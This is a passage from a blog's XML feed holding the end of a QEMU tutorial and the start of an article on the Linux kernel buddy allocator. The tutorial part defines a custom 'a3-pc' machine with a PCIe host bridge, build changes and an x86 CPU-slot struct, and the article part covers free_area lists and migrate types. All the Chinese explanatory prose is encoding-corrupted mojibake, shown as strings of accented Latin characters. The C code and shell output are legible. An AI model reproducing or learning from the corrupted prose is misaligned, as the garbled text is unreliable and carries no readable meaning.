callbacks: set_irq() and map_irq()</span><br><span class="hljs-comment">     */</span><br>    pci-&gt;bus = pci_register_root_bus(dev, <span class="hljs-string">&quot;a3-pcie0&quot;</span>,<br>                                    a3_pc_pcie_set_irq,<br>                                    a3_pc_pcie_swizzle_map_irq_fn,<br>                                    h, &amp;h-&gt;mem, &amp;h-&gt;io, <br>                                    <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, TYPE_PCIE_BUS);<br>&#125;<br><br><span class="hljs-type">static</span> Property a3_pc_pcie_host_props[] = &#123;<br>    DEFINE_PROP_END_OF_LIST(),<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    DeviceClass *dc = DEVICE_CLASS(oc);<br><br>    dc-&gt;realize = a3_pc_pcie_host_realize;<br>    set_bit(DEVICE_CATEGORY_BRIDGE, dc-&gt;categories);<br>    device_class_set_props(dc, a3_pc_pcie_host_props);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_pc_pcie_host = &#123;<br>    .name = TYPE_A3_PC_PCIE_HOST,<br>    .parent = TYPE_PCI_HOST_BRIDGE,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3PCPCIEHost),<br>    .instance_init = a3_pc_host_init,<br>    .class_init = a3_pc_class_init,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_pcie_host_register</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    type_register(&amp;a3_pc_pcie_host);<br>&#125;<br><br>type_init(a3_pc_pcie_host_register);<br></code></pre></td></tr></table></figure><blockquote><p>ä¿®æ”¹æ–‡ä»¶ï¼šhw&#x2F;pci-host&#x2F;meson.build</p><blockquote><p>è€ç‰ˆæœ¬æ²¡æµ‹äº†ï¼Œè‡ªå·±æƒ³è¯¥æ€ä¹ˆæ”¹å§ï¼ˆç¬‘ï¼‰</p></blockquote></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs meson"># A3 devices<br>pci_ss.add(when: &#x27;CONFIG_PCI&#x27;, if_true: files(&#x27;a3pc.c&#x27;))<br></code></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬åœ¨æˆ‘ä»¬çš„æœºå™¨ç±»å‹ä¸­åŠ ä¸Š PCI ç›¸å…³çš„ä¸¤ä¸ªæŒ‡é’ˆæˆå‘˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    MachineState parent;<br><br>    <span class="hljs-comment">/* &lt;public&gt; */</span><br><br>    <span class="hljs-comment">/* State for other subsystems/APIs: */</span><br>    Notifier machine_done;<br><br>    <span class="hljs-comment">/* Pointers to devices and objects: */</span><br>    PCIBus *bus;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * QEMU requires the entire PCI(e) hierarchy be attached to</span><br><span class="hljs-comment">     * a PCI(e) bus, so BES-VNC machine has to implement one.</span><br><span class="hljs-comment">     */</span><br>    PCIHostState *pci;<br>&#125; A3PCMachineState;<br></code></pre></td></tr></table></figure><p>æœ€ååœ¨æœºå™¨åˆå§‹åŒ–å‡½æ•°ä¸­åˆå§‹åŒ–ä¸€ä¸ªæˆ‘ä»¬è‡ªå®šä¹‰çš„è¿™ä¸ª PCIe è®¾å¤‡å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_init</span><span class="hljs-params">(MachineState *machine)</span><br>&#123;<br>    A3PCMachineState *ms = A3PC_MACHINE(machine);<br>    DeviceState *dev = qdev_new(TYPE_A3_PC_PCIE_HOST);<br><br>    sysbus_realize_and_unref(SYS_BUS_DEVICE(dev), &amp;error_fatal);<br>    ms-&gt;pci = PCI_HOST_BRIDGE(dev);<br><br>    memory_region_add_subregion(get_system_memory(), <span class="hljs-number">0</span>,<br>                                sysbus_mmio_get_region(SYS_BUS_DEVICE(dev), <span class="hljs-number">0</span>));<br><br>    ms-&gt;machine_done.notify = a3_pc_machine_init_done;<br>    qemu_add_machine_init_done_notifier(&amp;ms-&gt;machine_done);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„æ–°ç‰ˆæœ¬å’Œè€ç‰ˆæœ¬çš„ API ä¸åŒï¼Œåœ¨è€ç‰ˆæœ¬ä¸­åº”å½“ä½¿ç”¨å¦‚ä¸‹ APIï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_init</span><span class="hljs-params">(MachineState *machine)</span><br>&#123;<br>    A3PCMachineState *ms = A3PC_MACHINE(machine);<br><br>    DeviceState *dev = qdev_create(<span class="hljs-literal">NULL</span>, TYPE_A3_PC_PCIE_HOST);<br><br>    qdev_init_nofail(dev);<br>    ms-&gt;pci = PCI_HOST_BRIDGE(dev);<br><br>    memory_region_add_subregion(get_system_memory(), <span class="hljs-number">0</span>,<br>                                sysbus_mmio_get_region(SYS_BUS_DEVICE(dev), <span class="hljs-number">0</span>));<br><br>    ms-&gt;machine_done.notify = a3_pc_machine_init_done;<br>    qemu_add_machine_init_done_notifier(&amp;ms-&gt;machine_done);<br>&#125;<br></code></pre></td></tr></table></figure><p>å®Œæˆè¿™äº›æ­¥éª¤ä¹‹åæˆ‘ä»¬çš„æ–°æœºå™¨å°±èƒ½éšæ„æ’å…¥å„ç§ PCI è®¾å¤‡äº†ï¼›ï¼‰</p><h3 id="IIã€æ·»åŠ æ–°çš„-CPU-æ’æ§½ğŸ•Š"><a href="#IIã€æ·»åŠ æ–°çš„-CPU-æ’æ§½ğŸ•Š" class="headerlink" title="IIã€æ·»åŠ æ–°çš„ CPU æ’æ§½ğŸ•Š"></a>IIã€æ·»åŠ æ–°çš„ CPU æ’æ§½ğŸ•Š</h3><p>å½“ç„¶ï¼Œæˆ‘ä»¬çš„æœºå™¨è¿˜ç¼ºå°‘äº† CPUï¼Œæ²¡æœ‰ CPU çš„æœºå™¨è‡ªç„¶æ˜¯è·‘ä¸èµ·æ¥çš„ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬è¿˜éœ€è¦åœ¨æˆ‘ä»¬çš„æœºå™¨ç±»å‹å½“ä¸­æ·»åŠ ä¸Šç›¸åº”çš„ CPU æ’æ§½ï¼Œç”±äº Qemu å†…éƒ¨çš„åŸºç¡€ x86 æœºå™¨æ¶æ„å·²ç»å®ç°å¥½äº†åŸºç¡€æ¡†æ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æ”¹ä¸ºç»§æ‰¿è‡ªå¯¹åº”çš„ x86 åŸºç¡€æœºå™¨ç±»å³å¯</p><blockquote><p>å½“ç„¶ï¼Œå¦‚æœæ˜¯çº¯çº¯è‡ªå®šä¹‰çš„å¼‚æ¶æ„ï¼Œè¿™é‡Œè¿˜æ˜¯å¾—è‡ªå·±æ‰‹åŠ¨å†™ä¸€å¥—â€¦</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    X86MachineState parent;<br><br>    <span class="hljs-comment">/* &lt;public&gt; */</span><br><br>    <span class="hljs-comment">/* State for other subsystems/APIs: */</span><br>    Notifier machine_done;<br><br>    <span class="hljs-comment">/* Pointers to devices and objects: */</span><br>    PCIBus *bus;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * QEMU requires the entire PCI(e) hierarchy be attached to</span><br><span class="hljs-comment">     * a PCI(e) bus, so BES-VNC machine has to implement one.</span><br><span class="hljs-comment">     */</span><br>    PCIHostState *pci;<br>&#125; A3PCMachineState;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineClass</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    X86MachineClass parent;<br><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br><br>    <span class="hljs-comment">/* Default CPU model version.  See x86_cpu_set_default_version(). */</span><br>    <span class="hljs-type">int</span> default_cpu_version;<br>&#125; A3PCMachineClass;<br></code></pre></td></tr></table></figure><p>ä¸è¿‡æœºå™¨å®šä¹‰çš„æ–‡ä»¶å½“ä¸­éœ€è¦æ”¹åŠ¨çš„éƒ¨åˆ†ä¼šæ¯”é¢„æƒ³çš„è¦å¤šï¼Œ<del>æ‰€ä»¥è¿™é‡Œå°±å…ˆğŸ•ŠğŸ•ŠğŸ•Šäº†</del></p><h3 id="Extra-è‡ªå®šä¹‰-CPU-ğŸ•Š"><a href="#Extra-è‡ªå®šä¹‰-CPU-ğŸ•Š" class="headerlink" title="Extra.è‡ªå®šä¹‰ CPU ğŸ•Š"></a>Extra.è‡ªå®šä¹‰ CPU ğŸ•Š</h3><blockquote><p>ğŸ•ŠğŸ•ŠğŸ•Š</p></blockquote><h2 id="å››ã€ç¼–è¯‘è¿è¡ŒğŸ•Š"><a href="#å››ã€ç¼–è¯‘è¿è¡ŒğŸ•Š" class="headerlink" title="å››ã€ç¼–è¯‘è¿è¡ŒğŸ•Š"></a>å››ã€ç¼–è¯‘è¿è¡ŒğŸ•Š</h2><p>ç”±äºæˆ‘ä»¬æ–°å»ºç«‹çš„æœºå™¨ç±»å‹ä¸º <code>x86</code> æ¶æ„çš„æœºå™¨ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨æ‰§è¡Œ configure è„šæœ¬æ—¶æŒ‡å®š <code>--target-list=x86_64-softmmu</code> </p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯å‰å‰é¢ç¬”è€…æä¾›äº†ä¸¤ç§è®¾ç½® <code>CONFIG_A3_PC</code> çš„é€‰é¡¹ï¼šå¦‚æœæˆ‘ä»¬æ˜¯ç›´æ¥é€šè¿‡ä¿®æ”¹ <code>default.mak</code> ä½¿å¾— <code>CONFIG_A3_PC=y</code>ï¼Œåˆ™ç›´æ¥ç¼–è¯‘å³å¯ï¼›è‹¥æˆ‘ä»¬æ˜¯é€šè¿‡ä¿®æ”¹äº† <code>configure</code> æ¥æŒ‡å®š <code>CONFIG_A3_PC</code> çš„å€¼ï¼Œåˆ™åˆ›å»ºç¼–è¯‘è„šæœ¬çš„æ—¶å€™æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨æŒ‡å®š <code>--enable-a3-pc</code> æ¥ç¼–è¯‘ä¸Šæˆ‘ä»¬æ–°å¢çš„æœºå™¨ç±»å‹</p><p>ç¼–è¯‘å®Œæˆåæˆ‘ä»¬ä¾¿èƒ½å¤Ÿçœ‹åˆ°æˆ‘ä»¬æ–°æ·»åŠ çš„æœºå™¨ç±»å‹ <code>a3-pc</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">build$ </span><span class="language-bash">./qemu-system-x86_64 -machine ?</span><br>Supported machines are:<br>microvm              microvm (i386)<br>pc                   Standard PC (i440FX + PIIX, 1996) (alias of pc-i440fx-7.0)<br>pc-i440fx-7.0        Standard PC (i440FX + PIIX, 1996) (default)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">...</span><br>a3-pc                (null)<br></code></pre></td></tr></table></figure><blockquote><p>ğŸ•ŠğŸ•ŠğŸ•Š</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¸å¦‚ VMWareğŸ‘‹&lt;/p&gt;</summary>
    
    
    
    <category term="VIRTUALIZATION" scheme="http://blog.arttnba3.cn/categories/VIRTUALIZATION/"/>
    
    
    <category term="å­¦ä¹ æœ­è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="PCI" scheme="http://blog.arttnba3.cn/tags/PCI/"/>
    
    <category term="Qemu" scheme="http://blog.arttnba3.cn/tags/Qemu/"/>
    
    <category term="è™šæ‹ŸåŒ–" scheme="http://blog.arttnba3.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ã€OS.0x03ã€‘Linuxå†…æ ¸å†…å­˜ç®¡ç†II - Buddy System</title>
    <link href="http://blog.arttnba3.cn/2022/07/01/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/"/>
    <id>http://blog.arttnba3.cn/2022/07/01/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/</id>
    <published>2022-06-30T15:44:49.000Z</published>
    <updated>2023-05-08T17:54:32.482Z</updated>
    
    <content type="html"><![CDATA[<p>HEY DUDE!</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>åœ¨<a href="http://localhost:4000/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/">ä¸Šä¸€ç¯‡æ–‡ç« </a>ä¸­ç¬”è€…ç®€è¦é˜è¿°äº† Linux å†…æ ¸å½“ä¸­å†…å­˜çš„åŸºæœ¬ç»„ç»‡æ¶æ„ï¼šé¡µã€åŒºã€èŠ‚ç‚¹ï¼Œåœ¨æœ¬ç¯‡æ–‡ç« å½“ä¸­ç¬”è€…å°†é˜è¿°å†…æ ¸ä¸­æœ€<strong>åŸºç¡€</strong>çš„å†…å­˜åˆ†é…å™¨â€”â€”<strong>Buddy Systen</strong>ï¼ˆä¼™ä¼´ç³»ç»Ÿï¼‰</p><blockquote><p>é€šè¿‡è¯»å– <code>/proc/buddyinfo</code> å¯ä»¥è·å–å½“å‰ç³»ç»Ÿä¸­ buddy system çš„è¯¦ç»†ä¿¡æ¯</p><p><img src="https://i.loli.net/2021/11/30/eRiVXpyUkncYZus.png" alt="image.png"></p><blockquote><p>ç¬”è€…çš„ğŸ’»é…ç½®æ¯”è¾ƒğŸš®ï¼Œæ‰€ä»¥åªæœ‰ä¸€ä¸ª nodeï¼Œéå¸¸æŠ±æ­‰â€¦</p></blockquote></blockquote><blockquote><p>è¿™ç¯‡æ–‡ç« å…¶å®å¾ˆæ—©å°±å†™äº†ä¸ªæ¡†æ¶äº†ï¼Œä½†æ˜¯åé¢ä¸€ç›´æ²¡æœ‰æ¥å¾—åŠè¿›è¡Œè¡¥å®Œâ€¦ï¼ˆå…¶å®å°±æ˜¯æ‡’è€Œå·²å§ï¼ˆæ¼ï¼‰ï¼‰</p><p><img src="https://s2.loli.net/2022/06/08/7VaQ6riZOcmDuEg.png" alt="image.png"></p></blockquote><h1 id="0x01-buddy-system-ä¸­çš„å†…å­˜ç»„ç»‡å½¢å¼"><a href="#0x01-buddy-system-ä¸­çš„å†…å­˜ç»„ç»‡å½¢å¼" class="headerlink" title="0x01.buddy system ä¸­çš„å†…å­˜ç»„ç»‡å½¢å¼"></a>0x01.buddy system ä¸­çš„å†…å­˜ç»„ç»‡å½¢å¼</h1><h2 id="zone-ä¸­çš„-free-area-ç»“æ„ä½“æ•°ç»„"><a href="#zone-ä¸­çš„-free-area-ç»“æ„ä½“æ•°ç»„" class="headerlink" title="zone ä¸­çš„ free_area ç»“æ„ä½“æ•°ç»„"></a>zone ä¸­çš„ free_area ç»“æ„ä½“æ•°ç»„</h2><p>å‰æ–‡ä¸­æˆ‘ä»¬è®²åˆ°ï¼Œæ¯ä¸ª zone ç»“æ„ä½“ä¸­éƒ½æœ‰ä¸€ä¸ª free_area ç»“æ„ä½“æ•°ç»„ï¼Œç”¨ä»¥å­˜å‚¨ buddy system <strong>æŒ‰ç…§ order ç®¡ç†çš„é¡µé¢</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> &#123;</span><br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span><span class="hljs-title">free_area</span>[<span class="hljs-title">MAX_ORDER</span>];</span><br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­çš„ <code>MAX_ORDER</code> ä¸ºä¸€ä¸ªå¸¸é‡ï¼Œå€¼ä¸º 11</p><p>åœ¨ buddy system ä¸­æŒ‰ç…§ç©ºé—²é¡µé¢çš„è¿ç»­å¤§å°è¿›è¡Œåˆ†é˜¶ç®¡ç†ï¼Œè¿™é‡Œçš„ order çš„å®é™…å«ä¹‰ä¸º<strong>è¿ç»­çš„ç©ºé—²é¡µé¢çš„å¤§å°</strong>ï¼Œä¸è¿‡å•ä½ä¸æ˜¯é¡µé¢æ•°ï¼Œè€Œæ˜¯<code>é˜¶</code>ï¼Œå³å¯¹äºæ¯ä¸ªä¸‹æ ‡è€Œè¨€ï¼Œå…¶ä¸­æ‰€å­˜å‚¨çš„é¡µé¢å¤§å°ä¸ºï¼š<br>$$<br>2^{order}<br>$$<br>åœ¨ free_area ä¸­å­˜æ”¾çš„é¡µé¢é€šè¿‡è‡ªèº«çš„ç›¸åº”å­—æ®µè¿æ¥æˆåŒå‘é“¾è¡¨ç»“æ„ï¼Œç”±æ­¤æˆ‘ä»¬å¾—åˆ°è¿™æ ·ä¸€å¼ _Overview_ï¼š</p><p><img src="https://i.loli.net/2021/11/30/sOwdI5YMNUjLSib.png" alt="è‡ªå·±ç”»çš„å›¾.png"></p><p>ä¸‹é¢æˆ‘ä»¬æ¥è§£æ <code>free_area</code> çš„å…·ä½“ç»“æ„ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span><span class="hljs-title">free_list</span>[<span class="hljs-title">MIGRATE_TYPES</span>];</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>nr_free;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="free-listï¼šç©ºé—²é¡µé¢åŒå‘é“¾è¡¨"><a href="#free-listï¼šç©ºé—²é¡µé¢åŒå‘é“¾è¡¨" class="headerlink" title="free_listï¼šç©ºé—²é¡µé¢åŒå‘é“¾è¡¨"></a>free_listï¼šç©ºé—²é¡µé¢åŒå‘é“¾è¡¨</h3><p>æˆ‘ä»¬ä¸éš¾çœ‹å‡ºï¼šfree_area çš„ free_list å­—æ®µä¾¿æ˜¯ç”¨ä»¥å­˜æ”¾æŒ‡å‘ç©ºé—²é¡µé¢çš„æŒ‡é’ˆï¼Œå…¶é€šè¿‡ page ç»“æ„ä½“çš„ <code>lru</code> å­—æ®µå°† page ç»“æ„ä½“è¿æ¥æˆåŒå‘é“¾è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> &#123;</span><br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><span class="hljs-comment">/* é¡µç¼“å­˜ä¸åŒ¿åé¡µ */</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @lru: Pageout é“¾è¡¨, ä¾‹å¦‚ active_list ä¾¿ç”±</span><br><span class="hljs-comment"> * lruvec-&gt;lru_lock ä¿æŠ¤ã€‚  </span><br><span class="hljs-comment"> * æœ‰æ—¶ä¼šè¢«é¡µæ‰€æœ‰è€…ä½œä¸ºå¸¸è§„é“¾è¡¨ä½¿ç”¨ã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">lru</span>;</span><br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>page ç»“æ„ä½“ä¸­çš„ <code>lru</code> è¿™ä¸€å­—æ®µçš„ç±»å‹ä¸º <code>struct list_head</code>ï¼Œè¿™æ˜¯å†…æ ¸ç¼–ç¨‹ä¸­é€šç”¨çš„åŒå‘é“¾è¡¨ç»“æ„ï¼Œ<strong>free_list ä¸ lru é“¾è¡¨éƒ½ä½¿ç”¨è¯¥å­—æ®µ</strong> å°†é¡µç»“æ„ä½“ç»„ç»‡ä¸º_åŒå‘é“¾è¡¨_ï¼Œå³_ä¸€ä¸ªé¡µæ˜¯ä¸å¯èƒ½åŒæ—¶å‡ºç°åœ¨ lru é“¾è¡¨ä¸ buddy system ä¸­çš„_</p><h4 id="è¿ç§»ç±»å‹åˆ†é“¾è¡¨"><a href="#è¿ç§»ç±»å‹åˆ†é“¾è¡¨" class="headerlink" title="è¿ç§»ç±»å‹åˆ†é“¾è¡¨"></a><em>è¿ç§»ç±»å‹åˆ†é“¾è¡¨</em></h4><p>åœ¨è¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ°free_area ä¸­<strong>å¹¶éåªæœ‰ä¸€ä¸ªåŒå‘é“¾è¡¨</strong>ï¼Œè€Œæ˜¯æŒ‰ç…§ä¸åŒçš„â€œè¿ç§»ç±»å‹â€ï¼ˆmigrate typeï¼‰è¿›è¡Œåˆ†å¼€å­˜æ”¾ï¼Œè¿™æ˜¯ç”±äº_é¡µé¢è¿ç§»_æœºåˆ¶çš„å­˜åœ¨</p><p>é¡µé¢è¿ç§»ä¸»è¦ç”¨ä»¥è§£å†³å†…æ ¸ç©ºé—´ä¸­çš„<strong>ç¢ç‰‡é—®é¢˜</strong>ï¼Œåœ¨é•¿æœŸçš„è¿è¡Œä¹‹åå†…å­˜å½“ä¸­ç©ºé—²é¡µé¢çš„åˆ†å¸ƒå¯èƒ½æ˜¯é›¶æ•£çš„ï¼Œè¿™ä¾¿å¯¼è‡´äº†å†…æ ¸<strong>æœ‰å¯èƒ½æ— æ³•æ˜ å°„åˆ°è¶³å¤Ÿå¤§çš„è¿ç»­å†…å­˜</strong>ï¼Œå› æ­¤éœ€è¦è¿›è¡Œ_é¡µé¢è¿ç§»_â€”â€”å°†æ—§çš„é¡µé¢è¿ç§»åˆ°æ–°çš„ä½ç½®</p><p><img src="https://i.loli.net/2021/11/30/q7T6EjtIb9PVFY3.png" alt="ä»çŸ¥ä¹å·çš„å›¾.png"></p><p>ä½†<strong>å¹¶éæ‰€æœ‰çš„é¡µé¢éƒ½æ˜¯èƒ½å¤Ÿéšæ„è¿ç§»çš„</strong>ï¼Œå› æ­¤æˆ‘ä»¬åœ¨ buddy system å½“ä¸­è¿˜éœ€è¦å°†é¡µé¢æŒ‰ç…§è¿ç§»ç±»å‹è¿›è¡Œåˆ†ç±»</p><p>è¿ç§»ç±»å‹ç”±ä¸€ä¸ªæšä¸¾ç±»å‹å®šä¹‰ï¼Œå®šä¹‰äº <code>/include/linux/mmzone.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">migratetype</span> &#123;</span><br>MIGRATE_UNMOVABLE,<br>MIGRATE_MOVABLE,<br>MIGRATE_RECLAIMABLE,<br>MIGRATE_PCPTYPES,<span class="hljs-comment">/* the number of types on the pcp lists */</span><br>MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CMA</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * MIGRATE_CMA migration type is designed to mimic the way</span><br><span class="hljs-comment"> * ZONE_MOVABLE works.  Only movable pages can be allocated</span><br><span class="hljs-comment"> * from MIGRATE_CMA pageblocks and page allocator never</span><br><span class="hljs-comment"> * implicitly change migration type of MIGRATE_CMA pageblock.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The way to use it is to change migratetype of a range of</span><br><span class="hljs-comment"> * pageblocks to MIGRATE_CMA which can be done by</span><br><span class="hljs-comment"> * __free_pageblock_cma() function.  What is important though</span><br><span class="hljs-comment"> * is that a range of pageblocks must be aligned to</span><br><span class="hljs-comment"> * MAX_ORDER_NR_PAGES should biggest page be bigger then</span><br><span class="hljs-comment"> * a single pageblock.</span><br><span class="hljs-comment"> */</span><br>MIGRATE_CMA,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span><br>MIGRATE_ISOLATE,<span class="hljs-comment">/* can&#x27;t allocate from here */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>MIGRATE_TYPES<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><strong>MIGRATE_UNMOVABLE</strong>ï¼šè¿™ç±»å‹é¡µé¢åœ¨å†…å­˜å½“ä¸­æœ‰ç€å›ºå®šçš„ä½ç½®ï¼Œ<strong>ä¸èƒ½ç§»åŠ¨</strong></li><li><strong>MIGRATE_MOVABLE</strong>ï¼šè¿™ç±»é¡µé¢<strong>å¯ä»¥éšæ„ç§»åŠ¨</strong>ï¼Œä¾‹å¦‚ç”¨æˆ·ç©ºé—´çš„é¡µé¢ï¼Œæˆ‘ä»¬åªéœ€è¦å¤åˆ¶æ•°æ®åæ”¹å˜é¡µè¡¨æ˜ å°„å³å¯</li><li><strong>MIGRATE_RECLAIMABLE</strong>ï¼šè¿™ç±»é¡µé¢<strong>ä¸èƒ½ç›´æ¥ç§»åŠ¨ï¼Œä½†æ˜¯å¯ä»¥åˆ é™¤</strong>ï¼Œä¾‹å¦‚æ˜ å°„è‡ªæ–‡ä»¶çš„é¡µ</li><li><strong>MIGRATE_PCPTYPES</strong>ï¼š<code>per_cpu_pageset</code>ï¼Œå³æ¯ CPU 